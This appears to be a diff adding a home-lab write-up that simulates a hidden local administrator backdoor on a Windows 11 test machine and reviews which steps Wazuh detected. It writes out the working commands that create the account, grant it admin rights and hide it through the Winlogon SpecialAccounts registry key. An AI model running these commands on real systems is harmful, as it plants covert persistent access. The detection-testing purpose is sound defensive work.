@@ -1,0 +1,58 @@
+# Attack 02 – Persistence via Hidden Admin Account
+
+## Objective
+Simulate an attacker with existing access creating a backdoor local administrator account and hiding
+it from the Windows login screen, then assess Wazuh's detection.
+
+## Setup
+| | |
+|---|---|
+| Target | WIN11-VICTIM (192.168.151.131) |
+| Access | Local admin PowerShell (assumes prior compromise) |
+| MITRE ATT&CK | T1136.001 Create Account: Local Account, T1098 Account Manipulation, T1564 Hide Artifacts |
+
+## Attack
+```powershell
+net user svc_update "P@ssw0rd2026!" /add
+net localgroup Administrators svc_update /add
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svc_update /t REG_DWORD /d 0 /f
+```
+The account was named `svc_update` to blend in with legitimate service accounts. The registry key
+hides it from the login screen and the Settings accounts page.
+
+## Detection
+| Event ID | Rule | Description | Level |
+|---|---|---|---|
+| 4720 | 60109 | User account enabled or created | 8 |
+| 4732 | 60154 | Administrators Group Changed | 12 |
+| 4732 | 60170 | Users Group Changed | 5 |
+
+Both the account creation and the privilege escalation were detected, the latter at high severity
+(level 12) the moment the account gained admin rights.
+
+## Analysis & detection gaps
+1. **Account hiding not detected:** the `reg add` writing to the Winlogon `SpecialAccounts\UserList`
+   key raised no alert. The attacker successfully hid the account from the login screen without
+   detection. Fix: enable Windows registry auditing (Event 4657) or write a custom Wazuh rule
+   watching that key path.
+2. **Suspicious naming not scored:** the account passed as `svc_update`, mimicking a service account.
+   Default rules do not flag service-account-style names created interactively.
+3. **Questionable MITRE mapping:** rule 60154 maps the Administrators group change to T1484 (Domain
+   Policy Modification). This is inaccurate for a standalone host: adding a user to a local privileged
+   group is better described by T1098 (Account Manipulation). This is a second example of default
+   rules needing tuning, reinforcing the case for custom detections (Stage 4).
+
+## Cleanup
+```powershell
+net user svc_update /delete
+reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svc_update /f
+```
+
+## Evidence
+| Screenshot | Shows |
+|---|---|
+| `screenshots/06-create-admin-powershell.png` | The three attack commands |
+| `screenshots/06b-account-created-alert.png` | Event 4720 – account created (rule 60109) |
+| `screenshots/06c-admin-group-alert.png` | Event 4732 – Administrators group changed (rule 60154, level 12) |
+| `screenshots/06d-admin-group-alert-detail.png` | Alert detail – target group, subject account |
+| `screenshots/06e-admin-group-alert-detail.png` | Alert detail – rule 60154, level 12, MITRE mapping |
